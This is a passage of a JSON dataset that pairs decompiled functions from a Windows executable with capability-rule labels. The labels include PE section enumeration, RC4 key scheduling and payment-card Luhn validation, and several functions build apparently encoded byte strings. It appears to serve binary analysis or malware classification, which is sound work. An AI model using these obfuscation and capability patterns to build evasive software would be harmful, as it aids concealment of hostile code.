        "decompiled_code": "\nuchar * fcn.140002c00(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x45;\n    arg1[1] = 0x54;\n    arg1[2] = 0x62;\n    arg1[3] = 0x44;\n    arg1[4] = 0x79;\n    arg1[5] = 0x77;\n    arg1[6] = 0x70;\n    arg1[7] = 0x54;\n    arg1[8] = 0x7b;\n    arg1[9] = 0x4a;\n    arg1[10] = 0x7f;\n    arg1[0xb] = 0x5a;\n    arg1[0xc] = 6;\n    arg1[0xd] = 2;\n    arg1[0xe] = 0x2f;\n    arg1[0xf] = 0xb;\n    arg1[0x10] = 0xf;\n    arg1[0x11] = 0x3d;\n    arg1[0x12] = 0x31;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x31;\n    arg1[0x1f] = 0x21;\n    arg1[0x20] = 0x31;\n    arg1[0x21] = 0x34;\n    arg1[0x22] = 0x22;\n    arg1[0x23] = 0x32;\n    arg1[0x24] = 0x78;\n    arg1[0x25] = 0x2d;\n    arg1[0x26] = 0x32;\n    arg1[0x27] = 0x29;\n    arg1[0x28] = 0x39;\n    arg1[0x29] = 0x3c;\n    arg1[0x2a] = 0x3a;\n    arg1[0x2b] = 0x7f;\n    arg1[0x2c] = 9;\n    arg1[0x2d] = 0xf;\n    arg1[0x2e] = 0x42;\n    arg1[0x2f] = 0;\n    arg1[0x30] = 0x11;\n    arg1[0x31] = 0x17;\n    arg1[0x32] = 0x14;\n    arg1[0x33] = 2;\n    arg1[0x34] = 6;\n    arg1[0x35] = 0x1d;\n    arg1[0x36] = 0x14;\n    arg1[0x37] = 0x45;\n    arg1[0x38] = 0x44;\n    arg1[0x39] = 0x58;\n    arg1[0x3a] = 0x5b;\n    arg1[0x3b] = 0x5c;\n    arg1[0x3c] = 0x49;\n    arg1[0x3d] = 0x48;\n    arg1[0x3e] = 6;\n    arg1[0x3f] = 0x1d;\n    arg1[0x40] = 0x3e;\n    return arg1;\n}\n",
        "token_count": 931
    },
    "140002e1": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140002e1a(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x45;\n    arg1[1] = 0x54;\n    arg1[2] = 0x62;\n    arg1[3] = 0x44;\n    arg1[4] = 0x79;\n    arg1[5] = 0x77;\n    arg1[6] = 0x70;\n    arg1[7] = 0x54;\n    arg1[8] = 0x7b;\n    arg1[9] = 0x4a;\n    arg1[10] = 0x7f;\n    arg1[0xb] = 0x5a;\n    arg1[0xc] = 6;\n    arg1[0xd] = 2;\n    arg1[0xe] = 0x2f;\n    arg1[0xf] = 0xb;\n    arg1[0x10] = 0xf;\n    arg1[0x11] = 0x3d;\n    arg1[0x12] = 0x31;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x2b;\n    arg1[0x15] = 0x3b;\n    arg1[0x16] = 0x2f;\n    arg1[0x17] = 0x2a;\n    arg1[0x18] = 0x38;\n    arg1[0x19] = 0x28;\n    arg1[0x1a] = 0x2a;\n    arg1[0x1b] = 0x6f;\n    arg1[0x1c] = 0x24;\n    arg1[0x1d] = 0x39;\n    arg1[0x1e] = 0x20;\n    arg1[0x1f] = 0x36;\n    arg1[0x20] = 0x35;\n    arg1[0x21] = 0x31;\n    arg1[0x22] = 0x76;\n    arg1[0x23] = 0x3e;\n    arg1[0x24] = 0x36;\n    arg1[0x25] = 0x79;\n    arg1[0x26] = 0x39;\n    arg1[0x27] = 0x2e;\n    arg1[0x28] = 0x2e;\n    arg1[0x29] = 0x2f;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x31;\n    arg1[0x2c] = 0x14;\n    arg1[0x2d] = 0x41;\n    arg1[0x2e] = 0x12;\n    arg1[0x2f] = 0x11;\n    arg1[0x30] = 0xb;\n    arg1[0x31] = 6;\n    arg1[0x32] = 3;\n    arg1[0x33] = 0x14;\n    arg1[0x34] = 0x1b;\n    arg1[0x35] = 0x49;\n    arg1[0x36] = 0x47;\n    arg1[0x37] = 0x40;\n    arg1[0x38] = 0x55;\n    arg1[0x39] = 0x54;\n    arg1[0x3a] = 0x5d;\n    arg1[0x3b] = 0x4a;\n    arg1[0x3c] = 0x49;\n    arg1[0x3d] = 0x5d;\n    arg1[0x3e] = 0x49;\n    arg1[0x3f] = 0x51;\n    arg1[0x40] = 0x52;\n    arg1[0x41] = 0x46;\n    arg1[0x42] = 0x6e;\n    arg1[0x43] = 0x41;\n    return arg1;\n}\n",
        "token_count": 995
    },
    "14000304": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.14000304c(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x67;\n    arg1[1] = 0x59;\n    arg1[2] = 0x53;\n    arg1[3] = 0x52;\n    arg1[4] = 0x48;\n    arg1[5] = 0x50;\n    arg1[6] = 0x54;\n    arg1[7] = 0x5c;\n    arg1[8] = 0x1c;\n    arg1[9] = 0x5b;\n    arg1[10] = 0x51;\n    arg1[0xb] = 0x4d;\n    arg1[0xc] = 0x60;\n    arg1[0xd] = 0x70;\n    arg1[0xe] = 0x72;\n    arg1[0xf] = 99;\n    arg1[0x10] = 0x37;\n    arg1[0x11] = 0x20;\n    arg1[0x12] = 0x25;\n    arg1[0x13] = 0x28;\n    arg1[0x14] = 0x26;\n    arg1[0x15] = 0x2d;\n    arg1[0x16] = 0x39;\n    arg1[0x17] = 0x6b;\n    arg1[0x18] = 0x38;\n    arg1[0x19] = 0x22;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x2e;\n    arg1[0x1c] = 0x26;\n    arg1[0x1d] = 0x3e;\n    arg1[0x1e] = 0x3b;\n    arg1[0x1f] = 0x37;\n    arg1[0x20] = 0x74;\n    arg1[0x21] = 0x3c;\n    arg1[0x22] = 0x38;\n    arg1[0x23] = 0x7a;\n    arg1[0x24] = 0x35;\n    arg1[0x25] = 0x3c;\n    arg1[0x26] = 0x37;\n    arg1[0x27] = 0x34;\n    arg1[0x28] = 0x2e;\n    arg1[0x29] = 0x24;\n    arg1[0x2a] = 0x7e;\n    arg1[0x2b] = 0x1e;\n    arg1[0x2c] = 0x36;\n    arg1[0x2d] = 0x41;\n    arg1[0x2e] = 0x11;\n    arg1[0x2f] = 0;\n    arg1[0x30] = 5;\n    arg1[0x31] = 0xb;\n    arg1[0x32] = 0x48;\n    arg1[0x33] = 0x49;\n    arg1[0x34] = 0x46;\n    arg1[0x35] = 0x69;\n    return arg1;\n}\n",
        "token_count": 790
    },
    "14000320": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.14000320e(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x5a;\n    arg1[1] = 0x73;\n    arg1[2] = 0x57;\n    arg1[3] = 0x51;\n    arg1[4] = 0x68;\n    arg1[5] = 0x6d;\n    arg1[6] = 0x6e;\n    arg1[7] = 0x57;\n    arg1[8] = 0x54;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4c;\n    arg1[0xb] = 0x6d;\n    arg1[0xc] = 0x14;\n    arg1[0xd] = 0;\n    arg1[0xe] = 5;\n    arg1[0xf] = 0x1b;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0xd;\n    arg1[0x12] = 0x2b;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x3f;\n    arg1[0x1f] = 0x3c;\n    arg1[0x20] = 0x30;\n    arg1[0x21] = 0x3c;\n    arg1[0x22] = 0x30;\n    arg1[0x23] = 0x2e;\n    arg1[0x24] = 0x78;\n    arg1[0x25] = 0x29;\n    arg1[0x26] = 0x3f;\n    arg1[0x27] = 0x29;\n    arg1[0x28] = 0x31;\n    arg1[0x29] = 0x34;\n    arg1[0x2a] = 0x2d;\n    arg1[0x2b] = 0x2c;\n    arg1[0x2c] = 9;\n    arg1[0x2d] = 0xe;\n    arg1[0x2e] = 0xc;\n    arg1[0x2f] = 0x10;\n    arg1[0x30] = 0x5e;\n    arg1[0x31] = 0x45;\n    arg1[0x32] = 0x66;\n    return arg1;\n}\n",
        "token_count": 737
    },
    "1400033b": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.1400033b8(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x5a;\n    arg1[1] = 0x73;\n    arg1[2] = 0x57;\n    arg1[3] = 0x51;\n    arg1[4] = 0x68;\n    arg1[5] = 0x6d;\n    arg1[6] = 0x6e;\n    arg1[7] = 0x57;\n    arg1[8] = 0x54;\n    arg1[9] = 0x5a;\n    arg1[10] = 0x4c;\n    arg1[0xb] = 0x6d;\n    arg1[0xc] = 0x14;\n    arg1[0xd] = 0;\n    arg1[0xe] = 5;\n    arg1[0xf] = 0x1b;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0xd;\n    arg1[0x12] = 0x2b;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x25;\n    arg1[0x15] = 0x26;\n    arg1[0x16] = 0x2e;\n    arg1[0x17] = 0x22;\n    arg1[0x18] = 0x2a;\n    arg1[0x19] = 0x24;\n    arg1[0x1a] = 0x2b;\n    arg1[0x1b] = 0x2b;\n    arg1[0x1c] = 0x70;\n    arg1[0x1d] = 0x21;\n    arg1[0x1e] = 0x37;\n    arg1[0x1f] = 0x21;\n    arg1[0x20] = 0x39;\n    arg1[0x21] = 0x3c;\n    arg1[0x22] = 0x25;\n    arg1[0x23] = 0x24;\n    arg1[0x24] = 0x31;\n    arg1[0x25] = 0x36;\n    arg1[0x26] = 0x34;\n    arg1[0x27] = 0x28;\n    arg1[0x28] = 0x7c;\n    arg1[0x29] = 0x2e;\n    arg1[0x2a] = 0x2b;\n    arg1[0x2b] = 0x3c;\n    arg1[0x2c] = 3;\n    arg1[0x2d] = 4;\n    arg1[0x2e] = 0x11;\n    arg1[0x2f] = 0x10;\n    arg1[0x30] = 2;\n    arg1[0x31] = 0x10;\n    arg1[0x32] = 10;\n    arg1[0x33] = 0xb;\n    arg1[0x34] = 0x11;\n    arg1[0x35] = 0x47;\n    arg1[0x36] = 0x34;\n    return arg1;\n}\n",
        "token_count": 798
    },
    "14000358": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "validate payment card number using luhn algorithm with lookup table/f2e93a0d9a164553a93d71878df6b782",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuchar * fcn.140003582(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x44;\n    arg1[1] = 0x58;\n    arg1[2] = 0x54;\n    arg1[3] = 0x7e;\n    arg1[4] = 0x4d;\n    arg1[5] = 99;\n    arg1[6] = 0x4c;\n    arg1[7] = 0x57;\n    arg1[8] = 0x4f;\n    arg1[9] = 0x6d;\n    arg1[10] = 0x4a;\n    arg1[0xb] = 0x4d;\n    arg1[0xc] = 0x18;\n    arg1[0xd] = 0x34;\n    arg1[0xe] = 0x29;\n    arg1[0xf] = 0x15;\n    arg1[0x10] = 0x2c;\n    arg1[0x11] = 0xc;\n    arg1[0x12] = 0;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x20;\n    arg1[0x1f] = 0x36;\n    arg1[0x20] = 0x27;\n    arg1[0x21] = 0x20;\n    arg1[0x22] = 0x3b;\n    arg1[0x23] = 0x32;\n    arg1[0x24] = 0x78;\n    arg1[0x25] = 0x3a;\n    arg1[0x26] = 0x28;\n    arg1[0x27] = 0x3e;\n    arg1[0x28] = 0x3d;\n    arg1[0x29] = 0x29;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x3b;\n    arg1[0x2c] = 0x40;\n    arg1[0x2d] = 0x15;\n    arg1[0x2e] = 10;\n    arg1[0x2f] = 0x11;\n    arg1[0x30] = 1;\n    arg1[0x31] = 4;\n    arg1[0x32] = 2;\n    arg1[0x33] = 0x5d;\n    arg1[0x34] = 0x48;\n    arg1[0x35] = 0x69;\n    return arg1;\n}\n",
        "token_count": 774
    },
    "14001597": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.140015970(void)\n\n{\n    // WARNING: Could not recover jumptable at 0x00014001e4e8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_fopen)();\n    return;\n}\n",
        "token_count": 64
    },
    "14002038": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.140020380(char *arg1, char *arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    return *arg1 == *arg2;\n}\n",
        "token_count": 45
    },
    "14000acb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * fcn.14000acb0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (*(arg1 + 0x120) == 0) {\n        *(arg1 + 0x130) = 1;\n        piVar1 = NULL;\n    }\n    else {\n        iVar2 = *(arg2 + 0x10);\n        piVar1 = *(*(*(arg1 + 0x120) + 8) + 0x18);\n        if (-1 < iVar2) {\n            for (; (piVar1 != NULL && (*piVar1 == 0x2f)); piVar1 = *(piVar1 + 6)) {\n                if (iVar2 == 0) {\n                    return *(piVar1 + 4);\n                }\n                iVar2 = iVar2 + -1;\n            }\n            piVar1 = NULL;\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 217
    },
    "1400b76a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.1400b76a0(int64_t arg1, int64_t arg2, char **arg3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    char *pcVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    \n    pcVar3 = *arg3;\n    uVar5 = *(pcVar3 + -0x18) - 1;\n    uVar4 = arg2 - 1U;\n    if (uVar5 < arg2 - 1U) {\n        uVar4 = uVar5;\n    }\n    if (uVar4 == 0) {\n        bVar7 = true;\n    }\n    else {\n        uVar6 = 0;\n        do {\n            bVar7 = pcVar3[uVar5] == *(arg1 + uVar6);\n            uVar6 = uVar6 + 1;\n            uVar5 = uVar5 - 1;\n            if (uVar4 <= uVar6) break;\n        } while (bVar7);\n    }\n    cVar2 = *(arg1 + uVar4);\n    while ((uVar5 != 0 && (bVar7 != false))) {\n        pcVar1 = pcVar3 + uVar5;\n        uVar5 = uVar5 - 1;\n        bVar7 = *pcVar1 == cVar2;\n    }\n    if (cVar2 - 1U < 0x7e) {\n        bVar7 = bVar7 & (*pcVar3 == cVar2 || *pcVar3 < cVar2);\n    }\n    return bVar7;\n}\n",
        "token_count": 374
    },
    "1400bc6e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong * fcn.1400bc6e0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    code *pcVar6;\n    int64_t *piVar7;\n    int64_t **ppiVar8;\n    ulong arg1_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    iVar10 = 1;\n    if (arg1 != 0) {\n        iVar10 = arg1;\n    }\n    while( true ) {\n        puVar5 = sub.msvcrt.dll_malloc(iVar10);\n        if (puVar5 != NULL) {\n            return puVar5;\n        }\n        pcVar6 = fcn.1400b66b0();\n        if (pcVar6 == NULL) break;\n        (*pcVar6)();\n    }\n    piVar7 = fcn.1400bc7f0(8);\n    *piVar7 = *0x140110790 + 0x10;\n    fcn.1400bcdb0(piVar7, 0x1401135d0, fcn.1400b4730);\n    puVar5 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar5 == NULL) {\n        iVar10 = 0x90;\n        puVar5 = fcn.140020150(0x90);\n        if (puVar5 == NULL) {\n            fcn.1400b8f90();\n            piVar7 = iVar10 + 0xa0;\n            puVar5 = sub.msvcrt.dll_malloc();\n            if ((puVar5 != NULL) || (puVar5 = fcn.140020150(piVar7),  puVar5 != NULL)) {\n                *puVar5 = 0;\n                puVar5[0x13] = 0;\n                puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n                for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar5 + 0x14;\n            }\n            fcn.1400b8f90();\n            ppiVar8 = fcn.1400bcb60();\n            piVar1 = piVar7 + -10;\n            piStack240 = *ppiVar8;\n            if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar7 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar7 + -5) = iVar2 + 1;\n                *(ppiVar8 + 1) = *(ppiVar8 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar7[-6] = piStack240;\n                    *ppiVar8 = piVar1;\n                }\n                return piVar7[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar8 = piVar1;\n                return NULL;\n            }\n            fcn.1400b8f90();\n            if ((piStack240 == NULL) || (fcn.1400bc860(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b8f90();\n            }\n            iVar10 = piStack240[-7];\n            fcn.14001f750();\n            fcn.1400bc860(iVar10);\n            uStack272 = *(iVar10 + -0x10);\n            arg2 = *(iVar10 + -0x18);\n            iVar2 = *(iVar10 + -0x24);\n            uVar3 = *(iVar10 + -0x38);\n            arg1_00 = fcn.14001f770(*(iVar10 + -0x40));\n            fcn.1400bc860(arg1_00);\n            piVar7 = fcn.1400bcb70();\n            puVar5 = *piVar7;\n            if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400bc9da;\n            puVar5 = *puVar5;\n            while( true ) {\n                fcn.14001f340(0, arg2, auStack288);\n                cVar4 = fcn.14001f430(auStack288, puVar5[-0x12], puVar5, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar5 = 0x140112960;\n                cVar4 = fcn.14001f430(auStack288, 0x140112960, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400bc9fd;\n                piVar7 = fcn.1400bc7f0(8);\n                *piVar7 = *0x1401104c0 + 0x10;\n                fcn.1400bcdb0(piVar7, 0x140112960, 0x1400892d0);\ncode_r0x0001400bc9da:\n                puVar5 = puVar5 + 0x12;\n            }\n            fcn.1400bcd60();\ncode_r0x0001400bc9fd:\n            fcn.14001f750(uVar3);\n            ppiVar8 = fcn.1400bcb60();\n            piVar7 = *ppiVar8;\n            if (piVar7 != NULL) {\n                if ((*(piVar7 + 10) & 1) != 0) {\n                    piVar7 = *piVar7 + -0x90;\n                }\n                piVar7 = *piVar7;\n            }\n            return piVar7;\n        }\n    }\n    *puVar5 = 0;\n    puVar5[0x11] = 0;\n    puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n    for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar5;\n}\n",
        "token_count": 1508
    },
    "1400bcb6": {
        "rules": [
            "contain loop",
            "get thread local storage value",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid fcn.1400bcb60(ulong param_1, ulong param_2, uint64_t param_3, uint64_t param_4)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    piVar2 = *0x14010fc90;\n    if (**0x14010fc90 == 0) {\n        if (*0x1401093d0 != 0) {\n            return;\n        }\n        *0x1401093d0 = fcn.140015220(0x1401093c0);\n        return;\n    }\n    uVar11 = *0x1401093d0;\n    if (*0x1401093d0 == 0) {\n        if (**0x14010fc90 == 0) {\ncode_r0x0001400154ea:\n            uVar11 = *0x1401093d0;\n            if (*0x1401093d0 == 0) goto code_r0x0001400154f7;\n        }\n        else {\n            param_4 = *0x140106470;\n            if (*0x140106470 == 0) {\n                LOCK();\n                *0x140106474 = *0x140106474 + 1;\n                if (*0x140106474 == 0) {\n                    func_0x0001400152c0();\n                    *0x140106470 = 1;\n                }\n                else {\n                    param_3 = 0;\n                    do {\n                        (*pcVar4)();\n                    } while (*0x140106470 == 0);\n                }\n                if (*piVar2 == 0) goto code_r0x0001400154ea;\n            }\n            LOCK();\n            *0x140136240 = *0x140136240 + 1;\n            if ((*0x140136240 != 0) &&\n               (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x140136248, 0xffffffff),  iVar6 != 0)) {\n                LOCK();\n                *0x140136240 = *0x140136240 + -1;\n            }\n            if (*0x1401093d0 == 0) {\ncode_r0x0001400154f7:\n                *0x1401093d0 = *0x140136230 + 1;\n                *0x140136230 = *0x1401093d0;\n            }\n            uVar11 = *0x1401093d0;\n            if (*piVar2 != 0) {\n                LOCK();\n                *0x140136240 = *0x140136240 + -1;\n                if (-1 < *0x140136240) {\n                    param_3 = 0;\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x140136248, 1);\n                }\n            }\n        }\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar3 = *0x140136238;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar7 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar3);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar7 == NULL) {\n        puVar7 = uVar11 + 0x21;\n        uVar8 = 8;\n        puVar9 = sub.msvcrt.dll_calloc();\n        if (puVar9 == NULL) {\ncode_r0x000140015573:\n            sub.msvcrt.dll_abort();\n            if (*puVar7 < uVar8) {\n                *puVar7 = uVar8;\n                puVar7[3] = 0;\n            }\n            if (puVar7[1] < param_3) {\n                puVar7[1] = param_3;\n            }\n            if ((param_4 != 0) && (*puVar7 == uVar8)) {\n                puVar7[3] = param_4;\n                return;\n            }\n            return;\n        }\n        *puVar9 = uVar11 + 0x20;\n    }\n    else {\n        uVar1 = *puVar7;\n        puVar9 = puVar7;\n        if (uVar11 <= uVar1) goto code_r0x00014001539b;\n        uVar10 = uVar1 * 2;\n        if (uVar1 * 2 < uVar11) {\n            uVar10 = uVar11 + 0x20;\n        }\n        uVar8 = uVar10 * 8 + 8;\n        puVar9 = sub.msvcrt.dll_realloc();\n        if (puVar9 == NULL) goto code_r0x000140015573;\n        *puVar9 = uVar10;\n        sub.msvcrt.dll_memset(puVar9 + uVar1 + 1, 0, (uVar10 - uVar1) * 8);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140136238, puVar9);\n    if (iVar6 == 0) {\n        (*pcVar4)();\n    }\ncode_r0x00014001539b:\n    if (puVar9[uVar11] == 0) {\n        uVar8 = fcn.140015220(0x1401093c0);\n        puVar9[uVar11] = uVar8;\n    }\n    return;\n}\n",
        "token_count": 1275
    },
    "1400bcb7": {
        "rules": [
            "contain loop",
            "get thread local storage value",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid fcn.1400bcb70(ulong param_1, ulong param_2, uint64_t param_3, uint64_t param_4)\n\n{\n    uint64_t uVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint64_t *puVar7;\n    uint64_t uVar8;\n    uint64_t *puVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_Sleep;\n    piVar2 = *0x14010fc90;\n    if (**0x14010fc90 == 0) {\n        if (*0x1401093d0 != 0) {\n            return;\n        }\n        *0x1401093d0 = fcn.140015220(0x1401093c0);\n        return;\n    }\n    uVar11 = *0x1401093d0;\n    if (*0x1401093d0 == 0) {\n        if (**0x14010fc90 == 0) {\ncode_r0x0001400154ea:\n            uVar11 = *0x1401093d0;\n            if (*0x1401093d0 == 0) goto code_r0x0001400154f7;\n        }\n        else {\n            param_4 = *0x140106470;\n            if (*0x140106470 == 0) {\n                LOCK();\n                *0x140106474 = *0x140106474 + 1;\n                if (*0x140106474 == 0) {\n                    func_0x0001400152c0();\n                    *0x140106470 = 1;\n                }\n                else {\n                    param_3 = 0;\n                    do {\n                        (*pcVar4)();\n                    } while (*0x140106470 == 0);\n                }\n                if (*piVar2 == 0) goto code_r0x0001400154ea;\n            }\n            LOCK();\n            *0x140136240 = *0x140136240 + 1;\n            if ((*0x140136240 != 0) &&\n               (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x140136248, 0xffffffff),  iVar6 != 0)) {\n                LOCK();\n                *0x140136240 = *0x140136240 + -1;\n            }\n            if (*0x1401093d0 == 0) {\ncode_r0x0001400154f7:\n                *0x1401093d0 = *0x140136230 + 1;\n                *0x140136230 = *0x1401093d0;\n            }\n            uVar11 = *0x1401093d0;\n            if (*piVar2 != 0) {\n                LOCK();\n                *0x140136240 = *0x140136240 + -1;\n                if (-1 < *0x140136240) {\n                    param_3 = 0;\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x140136248, 1);\n                }\n            }\n        }\n    }\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar3 = *0x140136238;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar7 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar3);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar7 == NULL) {\n        puVar7 = uVar11 + 0x21;\n        uVar8 = 8;\n        puVar9 = sub.msvcrt.dll_calloc();\n        if (puVar9 == NULL) {\ncode_r0x000140015573:\n            sub.msvcrt.dll_abort();\n            if (*puVar7 < uVar8) {\n                *puVar7 = uVar8;\n                puVar7[3] = 0;\n            }\n            if (puVar7[1] < param_3) {\n                puVar7[1] = param_3;\n            }\n            if ((param_4 != 0) && (*puVar7 == uVar8)) {\n                puVar7[3] = param_4;\n                return;\n            }\n            return;\n        }\n        *puVar9 = uVar11 + 0x20;\n    }\n    else {\n        uVar1 = *puVar7;\n        puVar9 = puVar7;\n        if (uVar11 <= uVar1) goto code_r0x00014001539b;\n        uVar10 = uVar1 * 2;\n        if (uVar1 * 2 < uVar11) {\n            uVar10 = uVar11 + 0x20;\n        }\n        uVar8 = uVar10 * 8 + 8;\n        puVar9 = sub.msvcrt.dll_realloc();\n        if (puVar9 == NULL) goto code_r0x000140015573;\n        *puVar9 = uVar10;\n        sub.msvcrt.dll_memset(puVar9 + uVar1 + 1, 0, (uVar10 - uVar1) * 8);\n    }\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140136238, puVar9);\n    if (iVar6 == 0) {\n        (*pcVar4)();\n    }\ncode_r0x00014001539b:\n    if (puVar9[uVar11] == 0) {\n        uVar8 = fcn.140015220(0x1401093c0);\n        puVar9[uVar11] = uVar8;\n    }\n    return;\n}\n",
        "token_count": 1275
    },
    "140013a1": {
        "rules": [
            "write file on Windows"
        ],
